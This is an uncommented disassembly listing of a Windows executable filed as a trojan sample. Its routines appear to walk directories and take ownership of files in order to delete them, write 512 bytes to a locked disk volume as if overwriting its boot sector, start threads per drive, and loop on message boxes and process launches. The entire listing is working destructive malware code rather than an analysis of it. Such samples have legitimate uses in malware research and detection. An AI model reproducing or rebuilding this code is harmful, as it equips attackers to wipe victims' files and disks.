
malware_samples/trojan/c12886549f1710eb393c625d0d508c78a45a403e0432fa1aa50f97354e934ec6.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 e4 f8             	and    $0xfffffff8,%esp
  401006:	81 ec 6c 06 00 00    	sub    $0x66c,%esp
  40100c:	a1 04 30 41 00       	mov    0x413004,%eax
  401011:	33 c4                	xor    %esp,%eax
  401013:	89 84 24 68 06 00 00 	mov    %eax,0x668(%esp)
  40101a:	53                   	push   %ebx
  40101b:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40101e:	8b cb                	mov    %ebx,%ecx
  401020:	56                   	push   %esi
  401021:	57                   	push   %edi
  401022:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  401026:	e8 65 02 00 00       	call   0x401290
  40102b:	68 08 02 00 00       	push   $0x208
  401030:	8d 84 24 6c 04 00 00 	lea    0x46c(%esp),%eax
  401037:	6a 00                	push   $0x0
  401039:	50                   	push   %eax
  40103a:	e8 d1 14 00 00       	call   0x402510
  40103f:	83 c4 0c             	add    $0xc,%esp
  401042:	8d 84 24 68 04 00 00 	lea    0x468(%esp),%eax
  401049:	53                   	push   %ebx
  40104a:	50                   	push   %eax
  40104b:	ff 15 20 c0 40 00    	call   *0x40c020
  401051:	8b 3d 50 c0 40 00    	mov    0x40c050,%edi
  401057:	8d 84 24 68 04 00 00 	lea    0x468(%esp),%eax
  40105e:	68 e8 09 41 00       	push   $0x4109e8
  401063:	50                   	push   %eax
  401064:	ff d7                	call   *%edi
  401066:	8d 44 24 10          	lea    0x10(%esp),%eax
  40106a:	50                   	push   %eax
  40106b:	8d 84 24 6c 04 00 00 	lea    0x46c(%esp),%eax
  401072:	50                   	push   %eax
  401073:	ff 15 68 c0 40 00    	call   *0x40c068
  401079:	8b d8                	mov    %eax,%ebx
  40107b:	83 fb ff             	cmp    $0xffffffff,%ebx
  40107e:	75 19                	jne    0x401099
  401080:	33 c0                	xor    %eax,%eax
  401082:	5f                   	pop    %edi
  401083:	5e                   	pop    %esi
  401084:	5b                   	pop    %ebx
  401085:	8b 8c 24 68 06 00 00 	mov    0x668(%esp),%ecx
  40108c:	33 cc                	xor    %esp,%ecx
  40108e:	e8 35 07 00 00       	call   0x4017c8
  401093:	8b e5                	mov    %ebp,%esp
  401095:	5d                   	pop    %ebp
  401096:	c2 04 00             	ret    $0x4
  401099:	8b 35 24 c0 40 00    	mov    0x40c024,%esi
  40109f:	90                   	nop
  4010a0:	68 f0 09 41 00       	push   $0x4109f0
  4010a5:	8d 44 24 40          	lea    0x40(%esp),%eax
  4010a9:	50                   	push   %eax
  4010aa:	ff d6                	call   *%esi
  4010ac:	85 c0                	test   %eax,%eax
  4010ae:	0f 84 9b 00 00 00    	je     0x40114f
  4010b4:	68 f4 09 41 00       	push   $0x4109f4
  4010b9:	8d 44 24 40          	lea    0x40(%esp),%eax
  4010bd:	50                   	push   %eax
  4010be:	ff d6                	call   *%esi
  4010c0:	85 c0                	test   %eax,%eax
  4010c2:	0f 84 87 00 00 00    	je     0x40114f
  4010c8:	f7 44 24 10 00 04 00 	testl  $0x400,0x10(%esp)
  4010cf:	00 
  4010d0:	75 7d                	jne    0x40114f
  4010d2:	68 08 02 00 00       	push   $0x208
  4010d7:	8d 84 24 64 02 00 00 	lea    0x264(%esp),%eax
  4010de:	6a 00                	push   $0x0
  4010e0:	50                   	push   %eax
  4010e1:	e8 2a 14 00 00       	call   0x402510
  4010e6:	83 c4 0c             	add    $0xc,%esp
  4010e9:	8d 84 24 60 02 00 00 	lea    0x260(%esp),%eax
  4010f0:	ff 74 24 0c          	push   0xc(%esp)
  4010f4:	50                   	push   %eax
  4010f5:	ff 15 20 c0 40 00    	call   *0x40c020
  4010fb:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  4010ff:	50                   	push   %eax
  401100:	8d 84 24 64 02 00 00 	lea    0x264(%esp),%eax
  401107:	50                   	push   %eax
  401108:	ff d7                	call   *%edi
  40110a:	8d 8c 24 60 02 00 00 	lea    0x260(%esp),%ecx
  401111:	e8 7a 01 00 00       	call   0x401290
  401116:	f6 44 24 10 10       	testb  $0x10,0x10(%esp)
  40111b:	8d 84 24 60 02 00 00 	lea    0x260(%esp),%eax
  401122:	50                   	push   %eax
  401123:	74 24                	je     0x401149
  401125:	e8 d6 fe ff ff       	call   0x401000
  40112a:	68 fc 09 41 00       	push   $0x4109fc
  40112f:	8d 84 24 64 02 00 00 	lea    0x264(%esp),%eax
  401136:	50                   	push   %eax
  401137:	ff d7                	call   *%edi
  401139:	8d 84 24 60 02 00 00 	lea    0x260(%esp),%eax
  401140:	50                   	push   %eax
  401141:	ff 15 5c c0 40 00    	call   *0x40c05c
  401147:	eb 06                	jmp    0x40114f
  401149:	ff 15 4c c0 40 00    	call   *0x40c04c
  40114f:	8d 44 24 10          	lea    0x10(%esp),%eax
  401153:	50                   	push   %eax
  401154:	53                   	push   %ebx
  401155:	ff 15 60 c0 40 00    	call   *0x40c060
  40115b:	85 c0                	test   %eax,%eax
  40115d:	0f 85 3d ff ff ff    	jne    0x4010a0
  401163:	ff 74 24 0c          	push   0xc(%esp)
  401167:	ff 15 5c c0 40 00    	call   *0x40c05c
  40116d:	53                   	push   %ebx
  40116e:	ff 15 58 c0 40 00    	call   *0x40c058
  401174:	8b 8c 24 74 06 00 00 	mov    0x674(%esp),%ecx
  40117b:	b8 01 00 00 00       	mov    $0x1,%eax
  401180:	5f                   	pop    %edi
  401181:	5e                   	pop    %esi
  401182:	5b                   	pop    %ebx
  401183:	33 cc                	xor    %esp,%ecx
  401185:	e8 3e 06 00 00       	call   0x4017c8
  40118a:	8b e5                	mov    %ebp,%esp
  40118c:	5d                   	pop    %ebp
  40118d:	c2 04 00             	ret    $0x4
  401190:	55                   	push   %ebp
  401191:	8b ec                	mov    %esp,%ebp
  401193:	81 ec 04 04 00 00    	sub    $0x404,%esp
  401199:	a1 04 30 41 00       	mov    0x413004,%eax
  40119e:	33 c5                	xor    %ebp,%eax
  4011a0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4011a3:	53                   	push   %ebx
  4011a4:	56                   	push   %esi
  4011a5:	68 00 04 00 00       	push   $0x400
  4011aa:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  4011b0:	6a 00                	push   $0x0
  4011b2:	50                   	push   %eax
  4011b3:	e8 58 13 00 00       	call   0x402510
  4011b8:	83 c4 0c             	add    $0xc,%esp
  4011bb:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  4011c1:	50                   	push   %eax
  4011c2:	68 00 02 00 00       	push   $0x200
  4011c7:	ff 15 54 c0 40 00    	call   *0x40c054
  4011cd:	6a 00                	push   $0x0
  4011cf:	6a 00                	push   $0x0
  4011d1:	6a 00                	push   $0x0
  4011d3:	8b d8                	mov    %eax,%ebx
  4011d5:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  4011db:	50                   	push   %eax
  4011dc:	68 00 10 40 00       	push   $0x401000
  4011e1:	6a 00                	push   $0x0
  4011e3:	6a 00                	push   $0x0
  4011e5:	ff 15 38 c0 40 00    	call   *0x40c038
  4011eb:	33 f6                	xor    %esi,%esi
  4011ed:	85 db                	test   %ebx,%ebx
  4011ef:	74 37                	je     0x401228
  4011f1:	57                   	push   %edi
  4011f2:	8d bd 00 fc ff ff    	lea    -0x400(%ebp),%edi
  4011f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%eax,%eax,1)
  4011ff:	00 
  401200:	66 83 bc 75 fc fb ff 	cmpw   $0x0,-0x404(%ebp,%esi,2)
  401207:	ff 00 
  401209:	75 14                	jne    0x40121f
  40120b:	6a 00                	push   $0x0
  40120d:	6a 00                	push   $0x0
  40120f:	57                   	push   %edi
  401210:	68 00 10 40 00       	push   $0x401000
  401215:	6a 00                	push   $0x0
  401217:	6a 00                	push   $0x0
  401219:	ff 15 38 c0 40 00    	call   *0x40c038
  40121f:	46                   	inc    %esi
  401220:	83 c7 04             	add    $0x4,%edi
  401223:	3b f3                	cmp    %ebx,%esi
  401225:	72 d9                	jb     0x401200
  401227:	5f                   	pop    %edi
  401228:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40122b:	5e                   	pop    %esi
  40122c:	33 cd                	xor    %ebp,%ecx
  40122e:	5b                   	pop    %ebx
  40122f:	e8 94 05 00 00       	call   0x4017c8
  401234:	8b e5                	mov    %ebp,%esp
  401236:	5d                   	pop    %ebp
  401237:	c3                   	ret
  401238:	cc                   	int3
  401239:	cc                   	int3
  40123a:	cc                   	int3
  40123b:	cc                   	int3
  40123c:	cc                   	int3
  40123d:	cc                   	int3
  40123e:	cc                   	int3
  40123f:	cc                   	int3
  401240:	56                   	push   %esi
  401241:	8b 35 28 c0 40 00    	mov    0x40c028,%esi
  401247:	57                   	push   %edi
  401248:	8b 3d 58 c1 40 00    	mov    0x40c158,%edi
  40124e:	66 90                	xchg   %ax,%ax
  401250:	6a 10                	push   $0x10
  401252:	68 00 0a 41 00       	push   $0x410a00
  401257:	68 10 0a 41 00       	push   $0x410a10
  40125c:	6a 00                	push   $0x0
  40125e:	ff d7                	call   *%edi
  401260:	6a 0a                	push   $0xa
  401262:	ff d6                	call   *%esi
  401264:	eb ea                	jmp    0x401250
  401266:	cc                   	int3
  401267:	cc                   	int3
  401268:	cc                   	int3
  401269:	cc                   	int3
  40126a:	cc                   	int3
  40126b:	cc                   	int3
  40126c:	cc                   	int3
  40126d:	cc                   	int3
  40126e:	cc                   	int3
  40126f:	cc                   	int3
  401270:	6a 10                	push   $0x10
  401272:	68 58 0e 41 00       	push   $0x410e58
  401277:	68 70 0e 41 00       	push   $0x410e70
  40127c:	6a 00                	push   $0x0
  40127e:	ff 15 58 c1 40 00    	call   *0x40c158
  401284:	c3                   	ret
  401285:	cc                   	int3
  401286:	cc                   	int3
  401287:	cc                   	int3
  401288:	cc                   	int3
  401289:	cc                   	int3
  40128a:	cc                   	int3
  40128b:	cc                   	int3
  40128c:	cc                   	int3
  40128d:	cc                   	int3
  40128e:	cc                   	int3
  40128f:	cc                   	int3
  401290:	55                   	push   %ebp
  401291:	8b ec                	mov    %esp,%ebp
  401293:	83 ec 6c             	sub    $0x6c,%esp
  401296:	a1 04 30 41 00       	mov    0x413004,%eax
  40129b:	33 c5                	xor    %ebp,%eax
  40129d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4012a0:	53                   	push   %ebx
  4012a1:	56                   	push   %esi
  4012a2:	57                   	push   %edi
  4012a3:	33 ff                	xor    %edi,%edi
  4012a5:	8d 45 98             	lea    -0x68(%ebp),%eax
  4012a8:	6a 40                	push   $0x40
  4012aa:	57                   	push   %edi
  4012ab:	50                   	push   %eax
  4012ac:	8b d9                	mov    %ecx,%ebx
  4012ae:	89 7d dc             	mov    %edi,-0x24(%ebp)
  4012b1:	89 7d e8             	mov    %edi,-0x18(%ebp)
  4012b4:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  4012b7:	89 7d e0             	mov    %edi,-0x20(%ebp)
  4012ba:	e8 51 12 00 00       	call   0x402510
  4012bf:	83 c4 0c             	add    $0xc,%esp
  4012c2:	8b 35 04 c0 40 00    	mov    0x40c004,%esi
  4012c8:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4012cb:	89 7d f4             	mov    %edi,-0xc(%ebp)
  4012ce:	66 c7 45 f8 00 01    	movw   $0x100,-0x8(%ebp)
  4012d4:	89 7d ec             	mov    %edi,-0x14(%ebp)
  4012d7:	50                   	push   %eax
  4012d8:	57                   	push   %edi
  4012d9:	57                   	push   %edi
  4012da:	57                   	push   %edi
  4012db:	57                   	push   %edi
  4012dc:	57                   	push   %edi
  4012dd:	57                   	push   %edi
  4012de:	57                   	push   %edi
  4012df:	57                   	push   %edi
  4012e0:	6a 01                	push   $0x1
  4012e2:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4012e5:	66 c7 45 f0 00 05    	movw   $0x500,-0x10(%ebp)
  4012eb:	50                   	push   %eax
  4012ec:	ff d6                	call   *%esi
  4012ee:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4012f1:	50                   	push   %eax
  4012f2:	57                   	push   %edi
  4012f3:	57                   	push   %edi
  4012f4:	57                   	push   %edi
  4012f5:	57                   	push   %edi
  4012f6:	57                   	push   %edi
  4012f7:	57                   	push   %edi
  4012f8:	68 20 02 00 00       	push   $0x220
  4012fd:	6a 20                	push   $0x20
  4012ff:	6a 02                	push   $0x2
  401301:	8d 45 ec             	lea    -0x14(%ebp),%eax
  401304:	50                   	push   %eax
  401305:	ff d6                	call   *%esi
  401307:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40130a:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  40130d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401310:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  401313:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401316:	50                   	push   %eax
  401317:	57                   	push   %edi
  401318:	8d 45 98             	lea    -0x68(%ebp),%eax
  40131b:	c7 45 98 00 00 00 10 	movl   $0x10000000,-0x68(%ebp)
  401322:	50                   	push   %eax
  401323:	6a 02                	push   $0x2
  401325:	c7 45 9c 02 00 00 00 	movl   $0x2,-0x64(%ebp)
  40132c:	89 7d a0             	mov    %edi,-0x60(%ebp)
  40132f:	89 7d ac             	mov    %edi,-0x54(%ebp)
  401332:	c7 45 b0 05 00 00 00 	movl   $0x5,-0x50(%ebp)
  401339:	c7 45 b8 00 00 00 10 	movl   $0x10000000,-0x48(%ebp)
  401340:	c7 45 bc 02 00 00 00 	movl   $0x2,-0x44(%ebp)
  401347:	89 7d c0             	mov    %edi,-0x40(%ebp)
  40134a:	89 7d cc             	mov    %edi,-0x34(%ebp)
  40134d:	c7 45 d0 02 00 00 00 	movl   $0x2,-0x30(%ebp)
  401354:	ff 15 08 c0 40 00    	call   *0x40c008
  40135a:	8b 35 0c c0 40 00    	mov    0x40c00c,%esi
  401360:	57                   	push   %edi
  401361:	ff 75 e8             	push   -0x18(%ebp)
  401364:	57                   	push   %edi
  401365:	57                   	push   %edi
  401366:	6a 04                	push   $0x4
  401368:	6a 01                	push   $0x1
  40136a:	53                   	push   %ebx
  40136b:	ff d6                	call   *%esi
  40136d:	85 c0                	test   %eax,%eax
  40136f:	75 05                	jne    0x401376
  401371:	8d 78 01             	lea    0x1(%eax),%edi
  401374:	eb 41                	jmp    0x4013b7
  401376:	83 f8 05             	cmp    $0x5,%eax
  401379:	75 3c                	jne    0x4013b7
  40137b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40137e:	50                   	push   %eax
  40137f:	6a 20                	push   $0x20
  401381:	ff 15 2c c0 40 00    	call   *0x40c02c
  401387:	50                   	push   %eax
  401388:	ff 15 10 c0 40 00    	call   *0x40c010
  40138e:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401391:	ba bc 0e 41 00       	mov    $0x410ebc,%edx
  401396:	6a 01                	push   $0x1
  401398:	e8 d3 02 00 00       	call   0x401670
  40139d:	6a 00                	push   $0x0
  40139f:	ff 75 e8             	push   -0x18(%ebp)
  4013a2:	6a 00                	push   $0x0
  4013a4:	6a 00                	push   $0x0
  4013a6:	6a 04                	push   $0x4
  4013a8:	6a 01                	push   $0x1
  4013aa:	53                   	push   %ebx
  4013ab:	ff d6                	call   *%esi
  4013ad:	85 c0                	test   %eax,%eax
  4013af:	b9 01 00 00 00       	mov    $0x1,%ecx
  4013b4:	0f 44 f9             	cmove  %ecx,%edi
  4013b7:	ff 75 e8             	push   -0x18(%ebp)
  4013ba:	ff 15 34 c0 40 00    	call   *0x40c034
  4013c0:	ff 75 e4             	push   -0x1c(%ebp)
  4013c3:	8b 35 14 c0 40 00    	mov    0x40c014,%esi
  4013c9:	ff d6                	call   *%esi
  4013cb:	ff 75 e0             	push   -0x20(%ebp)
  4013ce:	ff d6                	call   *%esi
  4013d0:	ff 75 dc             	push   -0x24(%ebp)
  4013d3:	ff 15 30 c0 40 00    	call   *0x40c030
  4013d9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4013dc:	8b c7                	mov    %edi,%eax
  4013de:	5f                   	pop    %edi
  4013df:	5e                   	pop    %esi
  4013e0:	33 cd                	xor    %ebp,%ecx
  4013e2:	5b                   	pop    %ebx
  4013e3:	e8 e0 03 00 00       	call   0x4017c8
  4013e8:	8b e5                	mov    %ebp,%esp
  4013ea:	5d                   	pop    %ebp
  4013eb:	c3                   	ret
  4013ec:	cc                   	int3
  4013ed:	cc                   	int3
  4013ee:	cc                   	int3
  4013ef:	cc                   	int3
  4013f0:	56                   	push   %esi
  4013f1:	8b 35 50 c1 40 00    	mov    0x40c150,%esi
  4013f7:	57                   	push   %edi
  4013f8:	8b 3d 28 c0 40 00    	mov    0x40c028,%edi
  4013fe:	66 90                	xchg   %ax,%ax
  401400:	6a 00                	push   $0x0
  401402:	6a 00                	push   $0x0
  401404:	68 f0 0e 41 00       	push   $0x410ef0
  401409:	68 10 0f 41 00       	push   $0x410f10
  40140e:	6a 00                	push   $0x0
  401410:	6a 00                	push   $0x0
  401412:	ff d6                	call   *%esi
  401414:	6a 00                	push   $0x0
  401416:	6a 00                	push   $0x0
  401418:	68 24 0f 41 00       	push   $0x410f24
  40141d:	68 10 0f 41 00       	push   $0x410f10
  401422:	6a 00                	push   $0x0
  401424:	6a 00                	push   $0x0
  401426:	ff d6                	call   *%esi
  401428:	6a 00                	push   $0x0
  40142a:	6a 00                	push   $0x0
  40142c:	68 4c 0f 41 00       	push   $0x410f4c
  401431:	68 10 0f 41 00       	push   $0x410f10
  401436:	6a 00                	push   $0x0
  401438:	6a 00                	push   $0x0
  40143a:	ff d6                	call   *%esi
  40143c:	6a 00                	push   $0x0
  40143e:	6a 00                	push   $0x0
  401440:	68 74 0f 41 00       	push   $0x410f74
  401445:	68 10 0f 41 00       	push   $0x410f10
  40144a:	6a 00                	push   $0x0
  40144c:	6a 00                	push   $0x0
  40144e:	ff d6                	call   *%esi
  401450:	6a 00                	push   $0x0
  401452:	6a 00                	push   $0x0
  401454:	68 9c 0f 41 00       	push   $0x410f9c
  401459:	68 10 0f 41 00       	push   $0x410f10
  40145e:	6a 00                	push   $0x0
  401460:	6a 00                	push   $0x0
  401462:	ff d6                	call   *%esi
  401464:	6a 00                	push   $0x0
  401466:	6a 00                	push   $0x0
  401468:	68 d4 0f 41 00       	push   $0x410fd4
  40146d:	68 10 0f 41 00       	push   $0x410f10
  401472:	6a 00                	push   $0x0
  401474:	6a 00                	push   $0x0
  401476:	ff d6                	call   *%esi
  401478:	6a 00                	push   $0x0
  40147a:	6a 00                	push   $0x0
  40147c:	68 fc 0f 41 00       	push   $0x410ffc
  401481:	68 10 0f 41 00       	push   $0x410f10
  401486:	6a 00                	push   $0x0
  401488:	6a 00                	push   $0x0
  40148a:	ff d6                	call   *%esi
  40148c:	6a 00                	push   $0x0
  40148e:	6a 00                	push   $0x0
  401490:	68 28 10 41 00       	push   $0x411028
  401495:	68 10 0f 41 00       	push   $0x410f10
  40149a:	6a 00                	push   $0x0
  40149c:	6a 00                	push   $0x0
  40149e:	ff d6                	call   *%esi
  4014a0:	6a 00                	push   $0x0
  4014a2:	6a 00                	push   $0x0
  4014a4:	68 54 10 41 00       	push   $0x411054
  4014a9:	68 10 0f 41 00       	push   $0x410f10
  4014ae:	6a 00                	push   $0x0
  4014b0:	6a 00                	push   $0x0
  4014b2:	ff d6                	call   *%esi
  4014b4:	6a 00                	push   $0x0
  4014b6:	6a 00                	push   $0x0
  4014b8:	68 90 10 41 00       	push   $0x411090
  4014bd:	68 10 0f 41 00       	push   $0x410f10
  4014c2:	6a 00                	push   $0x0
  4014c4:	6a 00                	push   $0x0
  4014c6:	ff d6                	call   *%esi
  4014c8:	6a 00                	push   $0x0
  4014ca:	6a 00                	push   $0x0
  4014cc:	68 cc 10 41 00       	push   $0x4110cc
  4014d1:	68 10 0f 41 00       	push   $0x410f10
  4014d6:	6a 00                	push   $0x0
  4014d8:	6a 00                	push   $0x0
  4014da:	ff d6                	call   *%esi
  4014dc:	6a 00                	push   $0x0
  4014de:	6a 00                	push   $0x0
  4014e0:	68 ec 10 41 00       	push   $0x4110ec
  4014e5:	68 10 0f 41 00       	push   $0x410f10
  4014ea:	6a 00                	push   $0x0
  4014ec:	6a 00                	push   $0x0
  4014ee:	ff d6                	call   *%esi
  4014f0:	6a 00                	push   $0x0
  4014f2:	6a 00                	push   $0x0
  4014f4:	68 0c 11 41 00       	push   $0x41110c
  4014f9:	68 10 0f 41 00       	push   $0x410f10
  4014fe:	6a 00                	push   $0x0
  401500:	6a 00                	push   $0x0
  401502:	ff d6                	call   *%esi
  401504:	6a 00                	push   $0x0
  401506:	6a 00                	push   $0x0
  401508:	68 38 11 41 00       	push   $0x411138
  40150d:	68 10 0f 41 00       	push   $0x410f10
  401512:	6a 00                	push   $0x0
  401514:	6a 00                	push   $0x0
  401516:	ff d6                	call   *%esi
  401518:	68 e8 03 00 00       	push   $0x3e8
  40151d:	ff d7                	call   *%edi
  40151f:	e9 dc fe ff ff       	jmp    0x401400
  401524:	cc                   	int3
  401525:	cc                   	int3
  401526:	cc                   	int3
  401527:	cc                   	int3
  401528:	cc                   	int3
  401529:	cc                   	int3
  40152a:	cc                   	int3
  40152b:	cc                   	int3
  40152c:	cc                   	int3
  40152d:	cc                   	int3
  40152e:	cc                   	int3
  40152f:	cc                   	int3
  401530:	6a 00                	push   $0x0
  401532:	6a 00                	push   $0x0
  401534:	68 60 11 41 00       	push   $0x411160
  401539:	68 10 0f 41 00       	push   $0x410f10
  40153e:	6a 00                	push   $0x0
  401540:	6a 00                	push   $0x0
  401542:	ff 15 50 c1 40 00    	call   *0x40c150
  401548:	c3                   	ret
  401549:	cc                   	int3
  40154a:	cc                   	int3
  40154b:	cc                   	int3
  40154c:	cc                   	int3
  40154d:	cc                   	int3
  40154e:	cc                   	int3
  40154f:	cc                   	int3
  401550:	55                   	push   %ebp
  401551:	8b ec                	mov    %esp,%ebp
  401553:	81 ec 08 04 00 00    	sub    $0x408,%esp
  401559:	a1 04 30 41 00       	mov    0x413004,%eax
  40155e:	33 c5                	xor    %ebp,%eax
  401560:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401563:	56                   	push   %esi
  401564:	68 00 02 00 00       	push   $0x200
  401569:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  40156f:	6a 00                	push   $0x0
  401571:	50                   	push   %eax
  401572:	e8 99 0f 00 00       	call   0x402510
  401577:	83 c4 0c             	add    $0xc,%esp
  40157a:	6a 00                	push   $0x0
  40157c:	6a 00                	push   $0x0
  40157e:	6a 03                	push   $0x3
  401580:	6a 00                	push   $0x0
  401582:	6a 03                	push   $0x3
  401584:	68 00 00 00 40       	push   $0x40000000
  401589:	68 88 11 41 00       	push   $0x411188
  40158e:	ff 15 40 c0 40 00    	call   *0x40c040
  401594:	8b f0                	mov    %eax,%esi
  401596:	83 fe ff             	cmp    $0xffffffff,%esi
  401599:	75 2c                	jne    0x4015c7
  40159b:	6a 10                	push   $0x10
  40159d:	68 b0 11 41 00       	push   $0x4111b0
  4015a2:	68 cc 11 41 00       	push   $0x4111cc
  4015a7:	6a 00                	push   $0x0
  4015a9:	ff 15 58 c1 40 00    	call   *0x40c158
  4015af:	56                   	push   %esi
  4015b0:	ff 15 30 c0 40 00    	call   *0x40c030
  4015b6:	33 c0                	xor    %eax,%eax
  4015b8:	5e                   	pop    %esi
  4015b9:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4015bc:	33 cd                	xor    %ebp,%ecx
  4015be:	e8 05 02 00 00       	call   0x4017c8
  4015c3:	8b e5                	mov    %ebp,%esp
  4015c5:	5d                   	pop    %ebp
  4015c6:	c3                   	ret
  4015c7:	6a 00                	push   $0x0
  4015c9:	8d 85 f8 fb ff ff    	lea    -0x408(%ebp),%eax
  4015cf:	50                   	push   %eax
  4015d0:	6a 00                	push   $0x0
  4015d2:	6a 00                	push   $0x0
  4015d4:	6a 00                	push   $0x0
  4015d6:	6a 00                	push   $0x0
  4015d8:	68 18 00 09 00       	push   $0x90018
  4015dd:	56                   	push   %esi
  4015de:	ff 15 3c c0 40 00    	call   *0x40c03c
  4015e4:	6a 00                	push   $0x0
  4015e6:	8d 85 f8 fb ff ff    	lea    -0x408(%ebp),%eax
  4015ec:	50                   	push   %eax
  4015ed:	68 00 02 00 00       	push   $0x200
  4015f2:	8d 85 fc fb ff ff    	lea    -0x404(%ebp),%eax
  4015f8:	50                   	push   %eax
  4015f9:	56                   	push   %esi
  4015fa:	ff 15 64 c0 40 00    	call   *0x40c064
  401600:	85 c0                	test   %eax,%eax
  401602:	75 2b                	jne    0x40162f
  401604:	6a 10                	push   $0x10
  401606:	68 00 12 41 00       	push   $0x411200
  40160b:	68 18 12 41 00       	push   $0x411218
  401610:	50                   	push   %eax
  401611:	ff 15 58 c1 40 00    	call   *0x40c158
  401617:	56                   	push   %esi
  401618:	ff 15 30 c0 40 00    	call   *0x40c030
  40161e:	33 c0                	xor    %eax,%eax
  401620:	5e                   	pop    %esi
  401621:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401624:	33 cd                	xor    %ebp,%ecx
  401626:	e8 9d 01 00 00       	call   0x4017c8
  40162b:	8b e5                	mov    %ebp,%esp
  40162d:	5d                   	pop    %ebp
  40162e:	c3                   	ret
  40162f:	6a 00                	push   $0x0
  401631:	8d 85 f8 fb ff ff    	lea    -0x408(%ebp),%eax
  401637:	50                   	push   %eax
  401638:	6a 00                	push   $0x0
  40163a:	6a 00                	push   $0x0
  40163c:	6a 00                	push   $0x0
  40163e:	6a 00                	push   $0x0
  401640:	68 1c 00 09 00       	push   $0x9001c
  401645:	56                   	push   %esi
  401646:	ff 15 3c c0 40 00    	call   *0x40c03c
  40164c:	56                   	push   %esi
  40164d:	ff 15 30 c0 40 00    	call   *0x40c030
  401653:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401656:	b8 01 00 00 00       	mov    $0x1,%eax
  40165b:	33 cd                	xor    %ebp,%ecx
  40165d:	5e                   	pop    %esi
  40165e:	e8 65 01 00 00       	call   0x4017c8
  401663:	8b e5                	mov    %ebp,%esp
  401665:	5d                   	pop    %ebp
  401666:	c3                   	ret
  401667:	cc                   	int3
  401668:	cc                   	int3
  401669:	cc                   	int3
  40166a:	cc                   	int3
  40166b:	cc                   	int3
  40166c:	cc                   	int3
  40166d:	cc                   	int3
  40166e:	cc                   	int3
  40166f:	cc                   	int3
  401670:	55                   	push   %ebp
  401671:	8b ec                	mov    %esp,%ebp
  401673:	83 ec 1c             	sub    $0x1c,%esp
  401676:	a1 04 30 41 00       	mov    0x413004,%eax
  40167b:	33 c5                	xor    %ebp,%eax
  40167d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401680:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401683:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401686:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401689:	56                   	push   %esi
  40168a:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40168d:	8b f1                	mov    %ecx,%esi
  40168f:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401692:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  401699:	50                   	push   %eax
  40169a:	52                   	push   %edx
  40169b:	6a 00                	push   $0x0
  40169d:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%ebp)
  4016a4:	ff 15 18 c0 40 00    	call   *0x40c018
  4016aa:	6a 00                	push   $0x0
  4016ac:	6a 00                	push   $0x0
  4016ae:	6a 10                	push   $0x10
  4016b0:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4016b3:	50                   	push   %eax
  4016b4:	6a 00                	push   $0x0
  4016b6:	56                   	push   %esi
  4016b7:	ff 15 00 c0 40 00    	call   *0x40c000
  4016bd:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4016c0:	b8 01 00 00 00       	mov    $0x1,%eax
  4016c5:	33 cd                	xor    %ebp,%ecx
  4016c7:	5e                   	pop    %esi
  4016c8:	e8 fb 00 00 00       	call   0x4017c8
  4016cd:	8b e5                	mov    %ebp,%esp
  4016cf:	5d                   	pop    %ebp
  4016d0:	c3                   	ret
  4016d1:	cc                   	int3
  4016d2:	cc                   	int3
  4016d3:	cc                   	int3
  4016d4:	cc                   	int3
  4016d5:	cc                   	int3
  4016d6:	cc                   	int3
  4016d7:	cc                   	int3
  4016d8:	cc                   	int3
  4016d9:	cc                   	int3
  4016da:	cc                   	int3
  4016db:	cc                   	int3
  4016dc:	cc                   	int3
  4016dd:	cc                   	int3
  4016de:	cc                   	int3
  4016df:	cc                   	int3
  4016e0:	56                   	push   %esi
  4016e1:	57                   	push   %edi
  4016e2:	e8 69 fe ff ff       	call   0x401550
  4016e7:	6a 10                	push   $0x10
  4016e9:	68 5c 12 41 00       	push   $0x41125c
  4016ee:	68 68 12 41 00       	push   $0x411268
  4016f3:	6a 00                	push   $0x0
  4016f5:	ff 15 58 c1 40 00    	call   *0x40c158
  4016fb:	8b 3d 28 c0 40 00    	mov    0x40c028,%edi
  401701:	68 10 27 00 00       	push   $0x2710
  401706:	ff d7                	call   *%edi
  401708:	e8 83 fa ff ff       	call   0x401190
  40170d:	8b 35 38 c0 40 00    	mov    0x40c038,%esi
  401713:	6a 00                	push   $0x0
  401715:	6a 00                	push   $0x0
  401717:	6a 00                	push   $0x0
  401719:	68 f0 13 40 00       	push   $0x4013f0
  40171e:	6a 00                	push   $0x0
  401720:	6a 00                	push   $0x0
  401722:	ff d6                	call   *%esi
